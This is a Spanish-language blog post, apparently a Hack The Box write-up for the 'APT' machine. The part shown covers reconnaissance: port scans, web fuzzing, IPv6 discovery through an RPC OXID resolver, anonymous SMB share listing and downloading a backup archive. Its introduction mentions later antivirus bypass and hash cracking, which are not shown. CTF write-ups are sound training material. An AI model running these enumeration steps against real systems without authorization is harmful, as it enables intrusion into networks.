@@ -1,0 +1,1181 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - APT (insane) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - APT (insane)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-14T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - APT (insane)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-14T00:00:00-06:00","datePublished":"2024-04-14T00:00:00-06:00","description":"Posts sobre resolucion de CTFs y ciberseguridad.","headline":"HackTheBox - APT (insane)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt.html"},"url":"http://localhost:4000/hackthebox/machines/insane/2024/04/14/apt.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - APT (insane)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-04-14T00:00:00-06:00" itemprop="datePublished">
+        Apr 14, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/bbf0ca0388599663e0d8b6955a0760d3.png" />
+</p>
+
+<ul>
+  <li>En este post vamos a estar haciendo la maquina APT de la plataforma de Hack The Box donde mediante una enumeración por RPC encontramos que se esta empleando IPV6 en la maquina victima a partir de eso conoceremos la dirección IP y comenzaremos a enumerar por smb donde encontraremos un .zip que vamos a crackear, vamos a estar empleando kerbrute para validar usuarios, vamos a leer registros de la maquina, vamos a hacer un bypass al antivirus para poder correr el winpeas y en esta maquina vamos a estar jugando con un hash NTLMv1.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos escaneando los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135 10.129.96.60 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-31 19:00 CST
+Nmap scan report <span class="k">for </span>10.129.96.60
+Host is up <span class="o">(</span>0.092s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Microsoft IIS httpd 10.0
+|_http-title: Gigantic Hosting | Home
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Tenemos el puerto <strong>80</strong> abierto que esta corriendo un servicio <strong>http</strong> eso significa que hay una pagina web.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.60</span> <span class="o">-</span><span class="n">v</span>
+<span class="no">WhatWeb</span> <span class="n">report</span> <span class="k">for</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.60</span>
+<span class="no">Status</span>    <span class="p">:</span> <span class="mi">200</span> <span class="no">OK</span>
+<span class="no">Title</span>     <span class="p">:</span> <span class="no">Gigantic</span> <span class="no">Hosting</span> <span class="o">|</span> <span class="no">Home</span>
+<span class="no">IP</span>        <span class="p">:</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">96.60</span>
+<span class="no">Country</span>   <span class="p">:</span> <span class="no">RESERVED</span><span class="p">,</span> <span class="no">ZZ</span>
+
+<span class="no">Summary</span>   <span class="p">:</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Email</span><span class="p">[</span><span class="n">sales</span><span class="vi">@gigantichosting</span><span class="p">.</span><span class="nf">com</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">,</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">[</span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">javascript</span><span class="p">,</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">]</span>
+
+<span class="no">Detected</span> <span class="no">Plugins</span><span class="p">:</span>
+<span class="p">[</span> <span class="no">Bootstrap</span> <span class="p">]</span>
+	<span class="no">Bootstrap</span> <span class="n">is</span> <span class="n">an</span> <span class="nb">open</span> <span class="n">source</span> <span class="n">toolkit</span> <span class="k">for</span> <span class="n">developing</span> <span class="n">with</span>
+	<span class="no">HTML</span><span class="p">,</span> <span class="no">CSS</span><span class="p">,</span> <span class="ow">and</span> <span class="no">JS</span><span class="o">.</span>
+
+	<span class="no">Website</span>     <span class="p">:</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">getbootstrap</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span>
+
+<span class="p">[</span> <span class="no">Email</span> <span class="p">]</span>
+	<span class="no">Extract</span> <span class="n">email</span> <span class="n">addresses</span><span class="o">.</span> <span class="no">Find</span> <span class="n">valid</span> <span class="n">email</span> <span class="n">address</span> <span class="ow">and</span>
+	<span class="n">syntactically</span> <span class="n">invalid</span> <span class="n">email</span> <span class="n">addresses</span> <span class="n">from</span> <span class="ss">mailto: </span><span class="n">link</span>
+	<span class="n">tags</span><span class="o">.</span> <span class="no">We</span> <span class="n">match</span> <span class="n">syntactically</span> <span class="n">invalid</span> <span class="n">links</span> <span class="n">containing</span>
+	<span class="ss">mailto: </span><span class="n">to</span> <span class="kp">catch</span> <span class="n">anti</span><span class="o">-</span><span class="n">spam</span> <span class="n">email</span> <span class="n">addresses</span><span class="p">,</span> <span class="n">eg</span><span class="p">.</span> <span class="nf">bob</span> <span class="n">at</span>
+	<span class="n">gmail</span><span class="p">.</span><span class="nf">com</span><span class="o">.</span> <span class="no">This</span> <span class="n">uses</span> <span class="n">the</span> <span class="n">simplified</span> <span class="n">email</span> <span class="n">regular</span>
+	<span class="n">expression</span> <span class="n">from</span>
+	<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">regular</span><span class="o">-</span><span class="n">expressions</span><span class="p">.</span><span class="nf">info</span><span class="o">/</span><span class="n">email</span><span class="p">.</span><span class="nf">html</span> <span class="k">for</span> <span class="n">valid</span>
+	<span class="n">email</span> <span class="n">address</span> <span class="n">matching</span><span class="o">.</span>
+
+	<span class="no">String</span>       <span class="p">:</span> <span class="n">sales</span><span class="vi">@gigantichosting</span><span class="p">.</span><span class="nf">com</span>
+
+<span class="p">[</span> <span class="no">HTML5</span> <span class="p">]</span>
+	<span class="no">HTML</span> <span class="n">version</span> <span class="mi">5</span><span class="p">,</span> <span class="n">detected</span> <span class="n">by</span> <span class="n">the</span> <span class="n">doctype</span> <span class="n">declaration</span>
+
+
+<span class="p">[</span> <span class="no">HTTPServer</span> <span class="p">]</span>
+	<span class="no">HTTP</span> <span class="n">server</span> <span class="n">header</span> <span class="n">string</span><span class="o">.</span> <span class="no">This</span> <span class="n">plugin</span> <span class="n">also</span> <span class="n">attempts</span> <span class="n">to</span>
+	<span class="n">identify</span> <span class="n">the</span> <span class="n">operating</span> <span class="nb">system</span> <span class="n">from</span> <span class="n">the</span> <span class="n">server</span> <span class="n">header</span><span class="o">.</span>
+
+	<span class="no">String</span>       <span class="p">:</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span> <span class="p">(</span><span class="n">from</span> <span class="n">server</span> <span class="n">string</span><span class="p">)</span>
+
+<span class="p">[</span> <span class="no">JQuery</span> <span class="p">]</span>
+	<span class="no">A</span> <span class="n">fast</span><span class="p">,</span> <span class="n">concise</span><span class="p">,</span> <span class="no">JavaScript</span> <span class="n">that</span> <span class="n">simplifies</span> <span class="n">how</span> <span class="n">to</span> <span class="n">traverse</span>
+	<span class="no">HTML</span> <span class="n">documents</span><span class="p">,</span> <span class="n">handle</span> <span class="n">events</span><span class="p">,</span> <span class="n">perform</span> <span class="n">animations</span><span class="p">,</span> <span class="ow">and</span> <span class="n">add</span>
+	<span class="no">AJAX</span><span class="o">.</span>
+
+	<span class="no">Website</span>     <span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">jquery</span><span class="p">.</span><span class="nf">com</span><span class="o">/</span>
+
+<span class="p">[</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span> <span class="p">]</span>
+	<span class="no">Microsoft</span> <span class="no">Internet</span> <span class="no">Information</span> <span class="no">Services</span> <span class="p">(</span><span class="no">IIS</span><span class="p">)</span> <span class="k">for</span> <span class="no">Windows</span>
+	<span class="no">Server</span> <span class="n">is</span> <span class="n">a</span> <span class="n">flexible</span><span class="p">,</span> <span class="n">secure</span> <span class="ow">and</span> <span class="n">easy</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">manage</span> <span class="no">Web</span> <span class="n">server</span>
+	<span class="k">for</span> <span class="n">hosting</span> <span class="n">anything</span> <span class="n">on</span> <span class="n">the</span> <span class="no">Web</span><span class="o">.</span> <span class="no">From</span> <span class="n">media</span> <span class="n">streaming</span> <span class="n">to</span>
+	<span class="n">web</span> <span class="n">application</span> <span class="n">hosting</span><span class="p">,</span> <span class="no">IIS</span><span class="err">'</span><span class="n">s</span> <span class="n">scalable</span> <span class="ow">and</span> <span class="nb">open</span>
+	<span class="n">architecture</span> <span class="n">is</span> <span class="n">ready</span> <span class="n">to</span> <span class="n">handle</span> <span class="n">the</span> <span class="n">most</span> <span class="n">demanding</span> <span class="n">tasks</span><span class="o">.</span>
+
+	<span class="no">Version</span>      <span class="p">:</span> <span class="mf">10.0</span>
+	<span class="no">Website</span>     <span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="n">www</span><span class="p">.</span><span class="nf">iis</span><span class="p">.</span><span class="nf">net</span><span class="o">/</span>
+
+<span class="p">[</span> <span class="no">Script</span> <span class="p">]</span>
+	<span class="no">This</span> <span class="n">plugin</span> <span class="n">detects</span> <span class="n">instances</span> <span class="n">of</span> <span class="n">script</span> <span class="no">HTML</span> <span class="n">elements</span> <span class="ow">and</span>
+	<span class="n">returns</span> <span class="n">the</span> <span class="n">script</span> <span class="n">language</span><span class="o">/</span><span class="n">type</span><span class="o">.</span>
+
+	<span class="no">String</span>       <span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">javascript</span><span class="p">,</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span>
+
+<span class="no">HTTP</span> <span class="no">Headers</span><span class="p">:</span>
+	<span class="no">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="no">OK</span>
+	<span class="no">Content</span><span class="o">-</span><span class="no">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span>
+	<span class="no">Last</span><span class="o">-</span><span class="no">Modified</span><span class="p">:</span> <span class="no">Mon</span><span class="p">,</span> <span class="mi">23</span> <span class="no">Dec</span> <span class="mi">2019</span> <span class="mi">11</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">26</span> <span class="no">GMT</span>
+	<span class="no">Accept</span><span class="o">-</span><span class="no">Ranges</span><span class="p">:</span> <span class="n">bytes</span>
+	<span class="no">ETag</span><span class="p">:</span> <span class="s2">"0ef5b3b84b9d51:0"</span>
+	<span class="no">Server</span><span class="p">:</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span>
+	<span class="no">Date</span><span class="p">:</span> <span class="no">Mon</span><span class="p">,</span> <span class="mo">01</span> <span class="no">Apr</span> <span class="mi">2024</span> <span class="mo">01</span><span class="p">:</span><span class="mo">02</span><span class="p">:</span><span class="mo">04</span> <span class="no">GMT</span>
+	<span class="no">Connection</span><span class="p">:</span> <span class="n">close</span>
+	<span class="no">Content</span><span class="o">-</span><span class="no">Length</span><span class="p">:</span> <span class="mi">14879</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la pagina web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/insane/apt/1.png" />
+</p>
+
+<ul>
+  <li>Vamos a seguir haciendo <strong>Fuzzing</strong> ya que la pagina web no es muy interesante y no encontré nada así que vamos a ver si la herramienta <code class="language-plaintext highlighter-rouge">wfuzz</code> nos descubre algo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.96.60/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.129.96.60/FUZZ
+Total requests: 220546
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000002:   301        1 L      10 W       150 Ch      "images"
+000000189:   301        1 L      10 W       150 Ch      "Images"
+000000536:   301        1 L      10 W       147 Ch      "css"
+000000939:   301        1 L      10 W       146 Ch      "js"
+000002757:   301        1 L      10 W       149 Ch      "fonts"
+000003659:   301        1 L      10 W       150 Ch      "IMAGES"
+000005568:   301        1 L      10 W       149 Ch      "Fonts"
+000008461:   301        1 L      10 W       147 Ch      "CSS"
+000009123:   301        1 L      10 W       146 Ch      "JS"
+</span></code></pre></div></div>
+
+<ul>
+  <li>Bueno como tal también tenemos el protocolo <strong>RPC</strong> abierto pero no nos funciona.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.129.96.60
+Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Si buscamos en <a href="https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc">https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc</a> como enumerar este servicio al final del post nos dejan esta herramienta <a href="https://github.com/mubix/IOXIDResolver">https://github.com/mubix/IOXIDResolver</a> ya que es posible enumerar interfaces de red con <strong>rcp</strong> <a href="https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/</a>.</p>
+  </li>
+  <li>
+    <p>Vamos a clonarnos el repositorio.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content git clone https://github.com/mubix/IOXIDResolver
+Cloning into <span class="s1">'IOXIDResolver'</span>...
+remote: Enumerating objects: 33, <span class="k">done</span><span class="nb">.</span>
+remote: Counting objects: 100% <span class="o">(</span>33/33<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Compressing objects: 100% <span class="o">(</span>30/30<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+remote: Total 33 <span class="o">(</span>delta 12<span class="o">)</span>, reused 5 <span class="o">(</span>delta 2<span class="o">)</span>, pack-reused 0
+Receiving objects: 100% <span class="o">(</span>33/33<span class="o">)</span>, 9.04 KiB | 308.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
+Resolving deltas: 100% <span class="o">(</span>12/12<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+➜  content <span class="nb">cd </span>IOXIDResolver
+➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> <span class="nb">ls
+</span>IOXIDResolver.py  LICENSE  README.md  requirements.txt
+➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> pip <span class="nb">install</span> <span class="nt">-r</span> requirements.txt
+Defaulting to user installation because normal site-packages is not writeable
+Requirement already satisfied: impacket&gt;0 <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from <span class="nt">-r</span> requirements.txt <span class="o">(</span>line 1<span class="o">))</span> <span class="o">(</span>0.11.0<span class="o">)</span>
+Requirement already satisfied: dsinternals <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from impacket&gt;0-&gt;-r requirements.txt <span class="o">(</span>line 1<span class="o">))</span> <span class="o">(</span>1.2.4<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si ejecutamos la herramienta solo nos piden un <strong>target</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> python3 IOXIDResolver.py <span class="nt">-h</span>
+IOXIDResolver.py <span class="nt">-t</span> &lt;target&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Si le damos la <strong>IP</strong> vemos que nos reporta una dirección en <strong>IPV6</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> python3 IOXIDResolver.py <span class="nt">-t</span> 10.129.96.60
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Retrieving network interface of 10.129.96.60
+Address: apt
+Address: 10.129.96.60
+Address: dead:beef::1c3
+Address: dead:beef::b885:d62a:d679:573f
+Address: dead:beef::5c2e:939a:a5ff:2f03
+</code></pre></div></div>
+
+<ul>
+  <li>Para comprobar si la <code class="language-plaintext highlighter-rouge">ip</code> esta activa podemos lanzar un <code class="language-plaintext highlighter-rouge">ping</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  IOXIDResolver git:<span class="o">(</span>main<span class="o">)</span> ping6 <span class="nt">-c</span> 1 dead:beef::b885:d62a:d679:573f
+PING dead:beef::b885:d62a:d679:573f <span class="o">(</span>dead:beef::b885:d62a:d679:573f<span class="o">)</span> 56 data bytes
+64 bytes from dead:beef::b885:d62a:d679:573f: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>90.1 ms
+
+<span class="nt">---</span> dead:beef::b885:d62a:d679:573f ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 90.110/90.110/90.110/0.000 ms
+</code></pre></div></div>
+
+<h1 id="portscan-ipv6">PortScan ipv6</h1>
+
+<ul>
+  <li>Ahora lo que podemos hacer es un escaneo con <code class="language-plaintext highlighter-rouge">Nmap</code> para ver los puertos abiertos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,80,88,135,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49689,63855 <span class="nt">-6</span> dead:beef::b885:d62a:d679:573f <span class="nt">-oN</span> targeted2
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-31 19:35 CST
+Nmap scan report <span class="k">for </span>dead:beef::b885:d62a:d679:573f
+Host is up <span class="o">(</span>0.094s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+80/tcp    open  http         Microsoft IIS httpd 10.0
+| http-server-header:
+|   Microsoft-HTTPAPI/2.0
+|_  Microsoft-IIS/10.0
+|_http-title: Bad Request
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-01 01:35:24Z<span class="o">)</span>
+135/tcp   open  msrpc        Microsoft Windows RPC
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
+3269/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2024-04-01T01:36:34+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Not valid before: 2020-09-24T07:07:18
+|_Not valid after:  2050-09-24T07:17:18
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Bad Request
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Bad Request
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc        Microsoft Windows RPC
+49673/tcp open  msrpc        Microsoft Windows RPC
+49689/tcp open  msrpc        Microsoft Windows RPC
+63855/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: APT<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: <span class="nt">-8m34s</span>, deviation: 22m38s, median: <span class="nt">-1s</span>
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+|   Computer name: apt
+|   NetBIOS computer name: APT<span class="se">\x</span>00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: apt.htb.local
+|_  System <span class="nb">time</span>: 2024-04-01T02:36:24+01:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-time:
+|   <span class="nb">date</span>: 2024-04-01T01:36:25
+|_  start_date: 2024-04-01T00:50:55
+</code></pre></div></div>
+
+<h2 id="enumeración-ipv6">Enumeración IPV6</h2>
+
+<ul>
+  <li>Vemos que estamos ante un <strong>Windows Server 2016 Standard</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb dead:beef::b885:d62a:d679:573f
+SMB         dead:beef::b885:d62a:d679:573f 445    APT              <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:APT<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos agregar el dominio al <code class="language-plaintext highlighter-rouge">/etc/hots</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"dead:beef::b885:d62a:d679:573f apt apt.local.htb htb.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+dead:beef::b885:d62a:d679:573f apt apt.local.htb htb.local
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a enumerar recursos compartidos a nivel de red aprovechando que el servicio de <strong>smb</strong> esta abierto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient <span class="nt">-L</span> apt <span class="nt">-N</span>
+Anonymous login successful
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	backup          Disk
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share
+	SYSVOL          Disk      Logon server share
+apt is an IPv6 address <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<ul>
+  <li>El recurso <strong>backup</strong> es interesante vamos a conectarnos al recurso compartido y ver lo que hay adentro.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient //apt/backup <span class="nt">-N</span>
+Anonymous login successful
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Thu Sep 24 02:30:52 2020
+  ..                                  D        0  Thu Sep 24 02:30:52 2020
+  backup.zip                          A 10650961  Thu Sep 24 02:30:32 2020
+
+		5114623 blocks of size 4096. 2634373 blocks available
+smb: <span class="se">\&gt;</span> get backup.zip
+getting file <span class="se">\b</span>ackup.zip of size 10650961 as backup.zip <span class="o">(</span>1647.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1647.9 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<ul>
